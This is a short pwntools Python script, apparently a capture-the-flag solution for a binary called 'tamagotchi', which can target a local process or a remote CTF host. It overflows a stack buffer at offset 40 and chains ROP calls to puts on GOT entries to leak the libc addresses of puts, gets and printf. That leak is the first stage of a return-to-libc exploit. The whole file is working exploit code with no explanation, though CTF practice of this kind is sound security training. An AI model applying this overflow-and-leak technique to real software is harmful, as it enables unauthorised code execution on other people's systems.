from pwn import *

# This is the found offset to pollute rip
offset = 40

elf = ELF("./tamagotchi", checksec=False)
context.binary = elf
context.log_level = 'warn'

if args.REMOTE:
    host = args.HOST or "motherload.td.org.uit.no"
    port = int(args.PORT or 8009)
    p = remote(host, port)
    print("Using remote")
else:
    p = elf.process()
    print("Using local")

rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["puts"], [elf.got['gets']])
rop.call(elf.symbols["puts"], [elf.got['printf']])

payload  = b"A"*offset # Offset
payload += p64(0x000000000040101a) # Ret
payload += rop.chain()
    
p.recvuntil(b">>").decode()
p.sendline(b"2")
p.recvuntil(b">>").decode()
p.sendline(payload)

p.recvuntil(b"\n\n")
puts  = u64(p.recvuntil(b"\n").rstrip().ljust(8,b"\x00"))
print(f"puts found at {hex(puts)}")

gets  = u64(p.recvuntil(b"\n").rstrip().ljust(8,b"\x00"))
print(f"gets found at {hex(gets)}")

printf  = u64(p.recvuntil(b"\n").rstrip().ljust(8,b"\x00"))
print(f"printf found at {hex(printf)}")
